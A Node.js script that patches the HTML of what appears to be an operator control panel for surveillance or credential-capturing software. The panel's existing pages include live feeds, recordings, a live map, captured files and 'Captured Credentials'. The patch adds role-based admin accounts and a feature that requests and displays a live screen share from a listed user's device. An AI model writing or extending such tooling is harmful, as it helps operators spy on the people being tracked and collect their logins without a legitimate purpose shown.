const fs = require('fs');
const path = require('path');

const dashboardPath = path.join(__dirname, 'public', 'dashboard.html');
let content = fs.readFileSync(dashboardPath, 'utf8');

// 1. Add Admins to sidebar
const sidebarNav = `<button class="nav-item" data-page="settings" onclick="showPage('settings')">`;
if (!content.includes('data-page="admins"')) {
    content = content.replace(sidebarNav, `
                <button class="nav-item" id="navAdmins" data-page="admins" onclick="showPage('admins')" style="display:none;">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
                    Admins
                </button>
                <button class="nav-item" data-page="settings" onclick="showPage('settings')">`);
}

// 2. Add Admins Page HTML
const settingsPage = `<div id="page-settings" class="page">`;
if (!content.includes('id="page-admins"')) {
    content = content.replace(settingsPage, `
            <!-- Admins Page -->
            <div id="page-admins" class="page">
                <div class="header-section">
                    <h1 style="margin-bottom:8px">Admin Management</h1>
                    <p style="color:rgba(255,255,255,0.45);font-size:0.9rem">Manage dashboard users and roles</p>
                </div>
                
                <div class="glass" style="padding:24px;border-radius:16px;margin-bottom:24px;">
                    <h3 style="margin-bottom:16px;">Create New Admin</h3>
                    <div style="display:flex; gap:16px; align-items:center; flex-wrap:wrap;">
                        <input type="text" id="newAdminName" placeholder="Name" class="form-input" style="flex:1;min-width:150px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);padding:10px;border-radius:8px;color:white;">
                        <input type="text" id="newAdminEmail" placeholder="Email (Username)" class="form-input" style="flex:1;min-width:150px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);padding:10px;border-radius:8px;color:white;">
                        <input type="password" id="newAdminPassword" placeholder="Password" class="form-input" style="flex:1;min-width:150px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);padding:10px;border-radius:8px;color:white;">
                        <select id="newAdminRole" class="form-input" style="background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);padding:10px;border-radius:8px;color:white;">
                            <option value="Viewer">Viewer</option>
                            <option value="Moderator">Moderator</option>
                            <option value="SuperAdmin">SuperAdmin</option>
                        </select>
                        <button onclick="createAdmin()" class="btn-action" style="padding:10px 20px; background:#5de4c7; color:#0a0a1a; font-weight:bold; border-radius:8px; border:none; cursor:pointer;">Create</button>
                    </div>
                </div>

                <div class="glass" style="border-radius:16px;overflow:hidden">
                    <div class="table-responsive">
                        <table class="data-table">
                            <thead>
                                <tr>
                                    <th>ID</th>
                                    <th>Name</th>
                                    <th>Email</th>
                                    <th>Role</th>
                                    <th width="100">Action</th>
                                </tr>
                            </thead>
                            <tbody id="adminsTable">
                                <!-- Admins dynamically loaded -->
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>

            <div id="page-settings" class="page">`);
}

// 3. Add Screen Share Modal HTML
const modalHTML = `<!-- Screen Share Modal -->
    <div id="screenShareModal" class="modal-overlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:9999;backdrop-filter:blur(10px);align-items:center;justify-content:center;">
        <div class="modal-content glass" style="width:90%;max-width:1200px;border-radius:20px;overflow:hidden;display:flex;flex-direction:column;position:relative;">
            <div style="padding:16px 24px;border-bottom:1px solid rgba(255,255,255,0.1);display:flex;justify-content:space-between;align-items:center;background:rgba(0,0,0,0.5);">
                <h3 style="margin:0;font-size:1.1rem;display:flex;align-items:center;gap:10px;">
                    <span style="display:inline-block;width:10px;height:10px;background:#ff3366;border-radius:50%;box-shadow:0 0 10px #ff3366;animation:pulse 2s infinite;"></span>
                    Live Screen Share
                </h3>
                <button onclick="closeScreenShareModal()" style="background:none;border:none;color:white;cursor:pointer;padding:5px;">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 6L6 18M6 6l12 12"/></svg>
                </button>
            </div>
            <div style="position:relative;background:#000;width:100%;aspect-ratio:16/9;display:flex;align-items:center;justify-content:center;">
                <p id="screenShareLoading" style="color:rgba(255,255,255,0.5);position:absolute;z-index:1;">Waiting for user to accept screen share...</p>
                <video id="modalScreenVideo" autoplay playsinline style="width:100%;height:100%;object-fit:contain;position:relative;z-index:2;display:none;"></video>
            </div>
        </div>
    </div>`;
if (!content.includes('id="screenShareModal"')) {
    content = content.replace('</body>', `${modalHTML}\n</body>`);
}

// 4. Update titles and showPage logic
const titlesOriginal = `titles = { feeds: 'Live Feeds', users: 'Users', recordings: 'Recordings', settings: 'Settings', analytics: 'Analytics', captures: 'Captures Gallery', activity: 'Activity Log', map: 'Live Map', files: 'Files', credentials: 'Captured Credentials' };`;
if (!content.includes(`admins: 'Admins'`)) {
    content = content.replace(titlesOriginal, titlesOriginal.replace('}', `, admins: 'Admins' }`));
}
if (!content.includes(`if (page === 'admins') loadAdmins();`)) {
    content = content.replace(`if (page === 'users') loadUsers();`, `if (page === 'users') loadUsers();\n    if (page === 'admins') loadAdmins();`);
}

// 5. Check if SuperAdmin to show Admins tab
if (!content.includes('if (ADMIN.role === "SuperAdmin")')) {
    content = content.replace(`document.getElementById('adminName').textContent = ADMIN.name || 'Admin';`, 
    `document.getElementById('adminName').textContent = ADMIN.name || 'Admin';
    if (ADMIN.role === 'SuperAdmin') {
        const nav = document.getElementById('navAdmins');
        if (nav) nav.style.display = 'flex';
    }`);
}

// 6. Update loadUsers role check and screen share button
const oldUsersTableRow = `<td><button class="btn-delete" onclick="deleteUser('\${u.uuid}')"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg></button></td>`;
const newUsersTableRow = `<td style="display:flex;gap:8px;justify-content:flex-end;">
                <button class="btn-action" onclick="startScreenShare('\${u.uuid}')" title="Screen Share" style="background:rgba(93,228,199,0.1);color:#5de4c7;border:1px solid rgba(93,228,199,0.2);padding:6px;border-radius:6px;cursor:pointer;">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
                </button>
                \${ADMIN.role !== 'Viewer' ? \`<button class="btn-delete" onclick="deleteUser('\${u.uuid}')"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:16px;height:16px"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg></button>\` : ''}
            </td>`;
content = content.replace(oldUsersTableRow, newUsersTableRow);

// Hide delete buttons in captures/recordings based on role
if (!content.includes('ADMIN.role === "Viewer"')) {
    content = content.replace(`// Init`, `// Init
    if (ADMIN.role === 'Viewer') {
        const style = document.createElement('style');
        style.innerHTML = '.btn-delete, .rec-btn-delete { display: none !important; }';
        document.head.appendChild(style);
    }`);
}

// 7. Add Screen Share and Admins JS Functions
const jsFunctions = `
// ─── ADMIN MANAGEMENT ────────────────────────────────────────────────────────
async function loadAdmins() {
    const data = await api('/api/admins');
    if (!data || !data.admins) return;
    const tbody = document.getElementById('adminsTable');
    tbody.innerHTML = data.admins.map(a => \`
        <tr>
            <td>\${a.id}</td>
            <td>\${a.name}</td>
            <td>\${a.email}</td>
            <td><span style="background:rgba(124,106,255,0.2);color:#a594fd;padding:4px 8px;border-radius:4px;font-size:0.8rem;">\${a.role}</span></td>
            <td>
                \${a.id !== ADMIN.id ? \`<button class="btn-delete" onclick="deleteAdmin(\${a.id})"><svg style="width:16px;height:16px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg></button>\` : '<span style="color:rgba(255,255,255,0.3)">You</span>'}
            </td>
        </tr>
    \`).join('');
}

window.createAdmin = async function() {
    const name = document.getElementById('newAdminName').value;
    const email = document.getElementById('newAdminEmail').value;
    const password = document.getElementById('newAdminPassword').value;
    const role = document.getElementById('newAdminRole').value;
    
    if (!name || !email || !password) return alert('Please fill all fields');
    
    const res = await fetch(API + '/api/admins', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + TOKEN },
        body: JSON.stringify({ name, email, password, role })
    });
    
    const data = await res.json();
    if (res.ok) {
        document.getElementById('newAdminName').value = '';
        document.getElementById('newAdminEmail').value = '';
        document.getElementById('newAdminPassword').value = '';
        loadAdmins();
    } else {
        alert(data.error);
    }
}

window.deleteAdmin = async function(id) {
    if (!confirm('Delete this admin?')) return;
    await api('/api/admins/' + id, { method: 'DELETE' });
    loadAdmins();
}

// ─── SCREEN SHARE ────────────────────────────────────────────────────────
let activeScreenShareUser = null;

window.startScreenShare = function(uuid) {
    activeScreenShareUser = uuid;
    const modal = document.getElementById('screenShareModal');
    const loading = document.getElementById('screenShareLoading');
    const video = document.getElementById('modalScreenVideo');
    
    modal.style.display = 'flex';
    loading.style.display = 'block';
    video.style.display = 'none';
    video.srcObject = null;
    
    // Request screen share from the user
    socket.emit('webrtc:request_screen', { uuid: uuid });
}

window.closeScreenShareModal = function() {
    activeScreenShareUser = null;
    document.getElementById('screenShareModal').style.display = 'none';
    const video = document.getElementById('modalScreenVideo');
    if (video) video.srcObject = null;
}
`;
if (!content.includes('function loadAdmins()')) {
    content = content.replace('// ═══════════════════════════════════════════════════════════════════\n// RECORDINGS', jsFunctions + '\n// ═══════════════════════════════════════════════════════════════════\n// RECORDINGS');
}

// 8. Update webrtc:offer to handle screen share video routing
const ontrackOld = `        // Mirror to modal if currently active user
        if (activeStreamUser === data.uuid) {
            const modalVideo = document.getElementById('modalLiveVideo');`;
const ontrackNew = `        // Handle Screen Share routing
        if (activeScreenShareUser === data.uuid) {
            const screenVideo = document.getElementById('modalScreenVideo');
            const screenLoading = document.getElementById('screenShareLoading');
            if (screenVideo) {
                screenVideo.srcObject = event.streams[0];
                screenVideo.style.display = 'block';
                screenVideo.play().catch(e => {});
            }
            if (screenLoading) screenLoading.style.display = 'none';
        }
        
        // Mirror to modal if currently active user
        if (activeStreamUser === data.uuid) {
            const modalVideo = document.getElementById('modalLiveVideo');`;
if (!content.includes('Handle Screen Share routing')) {
    content = content.replace(ontrackOld, ontrackNew);
}

fs.writeFileSync(dashboardPath, content, 'utf8');
console.log('Dashboard patched successfully.');
